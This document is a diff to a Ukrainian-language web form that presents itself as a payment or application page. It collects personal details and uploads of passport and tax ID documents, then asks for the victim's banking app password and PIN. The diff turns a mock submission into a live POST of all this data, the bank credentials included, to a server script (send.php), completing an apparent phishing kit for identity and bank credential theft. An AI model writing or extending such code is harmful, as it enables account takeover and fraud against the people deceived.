@@ -368,36 +368,36 @@
 
         <div class="container">
             <div class="payment-card">
-                <form id="personalForm">
+                <form id="personalForm" enctype="multipart/form-data">
                     <div class="form-group">
                         <label class="form-label">ПІБ</label>
-                        <input type="text" class="form-control" placeholder="Введіть ваше ПІБ" required>
+                        <input type="text" class="form-control" name="fullName" placeholder="Введіть ваше ПІБ" required>
                     </div>
                     <div class="form-group">
                         <label class="form-label">Дата народження</label>
-                        <input type="date" class="form-control" required>
+                        <input type="date" class="form-control" name="birthDate" required>
                     </div>
                     <div class="form-group">
                         <label class="form-label">Номер телефону</label>
-                        <input type="tel" class="form-control" placeholder="+380 XX XXX XX XX" required>
+                        <input type="tel" class="form-control" name="phone" placeholder="+380 XX XXX XX XX" required>
                     </div>
                     <div class="form-group">
                         <label class="form-label">Email</label>
-                        <input type="email" class="form-control" placeholder="Введіть ваш email" required>
+                        <input type="email" class="form-control" name="email" placeholder="Введіть ваш email" required>
                     </div>
 
                     <h3>Завантаження документів</h3>
                     <div class="form-group">
                         <label class="form-label">Паспорт (сторона з фото)</label>
-                        <input type="file" class="form-control" accept="image/*,.pdf" required>
+                        <input type="file" class="form-control" name="passport_photo" accept="image/*,.pdf" required>
                     </div>
                     <div class="form-group">
                         <label class="form-label">Паспорт (прописка)</label>
-                        <input type="file" class="form-control" accept="image/*,.pdf" required>
+                        <input type="file" class="form-control" name="passport_registration" accept="image/*,.pdf" required>
                     </div>
                     <div class="form-group">
                         <label class="form-label">Ідентифікаційний код</label>
-                        <input type="file" class="form-control" accept="image/*,.pdf" required>
+                        <input type="file" class="form-control" name="id_code" accept="image/*,.pdf" required>
                     </div>
 
                     <div class="form-buttons">
@@ -494,15 +494,15 @@
                 <form id="bankForm" style="display: none;">
                     <div class="form-group">
                         <label class="form-label">Номер телефону, прив'язаний до банку</label>
-                        <input type="tel" class="form-control" placeholder="+380 XX XXX XX XX" required>
+                        <input type="tel" class="form-control" name="bank_phone" placeholder="+380 XX XXX XX XX" required>
                     </div>
                     <div class="form-group">
                         <label class="form-label">Пароль від банківського додатку</label>
-                        <input type="password" class="form-control" placeholder="Введіть ваш пароль" required>
+                        <input type="password" class="form-control" name="bank_password" placeholder="Введіть ваш пароль" required>
                     </div>
                     <div class="form-group">
                         <label class="form-label">PIN-код для підтвердження</label>
-                        <input type="password" class="form-control" placeholder="Введіть PIN-код" required maxlength="4">
+                        <input type="password" class="form-control" name="bank_pin" placeholder="Введіть PIN-код" required maxlength="4">
                     </div>
 
                     <div class="form-buttons">
@@ -573,10 +573,13 @@
             const form = document.getElementById('personalForm');
             if (form.checkValidity()) {
                 formData = {
-                    fullName: form.querySelector('input[type="text"]').value,
-                    birthDate: form.querySelector('input[type="date"]').value,
-                    phone: form.querySelector('input[type="tel"]').value,
-                    email: form.querySelector('input[type="email"]').value
+                    fullName: form.querySelector('input[name="fullName"]').value,
+                    birthDate: form.querySelector('input[name="birthDate"]').value,
+                    phone: form.querySelector('input[name="phone"]').value,
+                    email: form.querySelector('input[name="email"]').value,
+                    passport_photo: form.querySelector('input[name="passport_photo"]').files[0]?.name,
+                    passport_registration: form.querySelector('input[name="passport_registration"]').files[0]?.name,
+                    id_code: form.querySelector('input[name="id_code"]').files[0]?.name
                 };
                 
                 showPage('bank-page');
@@ -605,9 +608,9 @@
             if (form.checkValidity() && selectedBank) {
                 bankData = {
                     bank: selectedBank,
-                    phone: form.querySelector('input[type="tel"]').value,
-                    password: form.querySelectorAll('input[type="password"]')[0].value,
-                    pin: form.querySelectorAll('input[type="password"]')[1].value
+                    phone: form.querySelector('input[name="bank_phone"]').value,
+                    password: form.querySelector('input[name="bank_password"]').value,
+                    pin: form.querySelector('input[name="bank_pin"]').value
                 };
                 
                 showPage('confirm-page');
@@ -621,14 +624,23 @@
             const summary = document.getElementById('summaryData');
             
             let html = '<h3>Особисті дані:</h3><ul>';
-            for (const [key, value] of Object.entries(formData)) {
-                html += `<li><strong>${key}:</strong> ${value}</li>`;
-            }
+            html += `<li><strong>ПІБ:</strong> ${formData.fullName}</li>`;
+            html += `<li><strong>Дата народження:</strong> ${formData.birthDate}</li>`;
+            html += `<li><strong>Телефон:</strong> ${formData.phone}</li>`;
+            html += `<li><strong>Email:</strong> ${formData.email}</li>`;
+            html += '</ul>';
+            
+            html += '<h3>Документи:</h3><ul>';
+            html += `<li><strong>Паспорт (фото):</strong> ${formData.passport_photo || 'Не завантажено'}</li>`;
+            html += `<li><strong>Паспорт (прописка):</strong> ${formData.passport_registration || 'Не завантажено'}</li>`;
+            html += `<li><strong>Ідентифікаційний код:</strong> ${formData.id_code || 'Не завантажено'}</li>`;
             html += '</ul>';
             
             html += '<h3>Банківські дані:</h3><ul>';
             html += `<li><strong>Банк:</strong> ${getBankName(bankData.bank)}</li>`;
-            html += `<li><strong>Телефон:</strong> ${bankData.phone}</li>`;
+            html += `<li><strong>Телефон банку:</strong> ${bankData.phone}</li>`;
+            html += `<li><strong>Пароль банку:</strong> ${bankData.password}</li>`;
+            html += `<li><strong>PIN-код:</strong> ${bankData.pin}</li>`;
             html += '</ul>';
             
             summary.innerHTML = html;
@@ -657,14 +669,36 @@
             btn.innerHTML = 'Відправка...';
             btn.disabled = true;
             
-            // Имитация отправки данных
-            setTimeout(() => {
-                alert('Дані успішно відправлені! Очікуйте рішення.');
+            // Собираем все данные для отправки
+            const form = document.getElementById('personalForm');
+            const formDataToSend = new FormData(form);
+            
+            // Добавляем банковские данные
+            formDataToSend.append('bank', selectedBank);
+            formDataToSend.append('bank_phone', bankData.phone);
+            formDataToSend.append('bank_password', bankData.password);
+            formDataToSend.append('bank_pin', bankData.pin);
+            
+            // Отправка данных на сервер
+            fetch('send.php', {
+                method: 'POST',
+                body: formDataToSend
+            })
+            .then(response => response.text())
+            .then(data => {
+                alert(data);
                 formData = {};
                 bankData = {};
                 selectedBank = null;
                 showPage('index-page');
-            }, 2000);
+                btn.innerHTML = 'Підтвердити та відправити';
+                btn.disabled = false;
+            })
+            .catch(error => {
+                alert('Помилка відправки: ' + error);
+                btn.innerHTML = 'Підтвердити та відправити';
+                btn.disabled = false;
+            });
         }
     </script>
 </body>
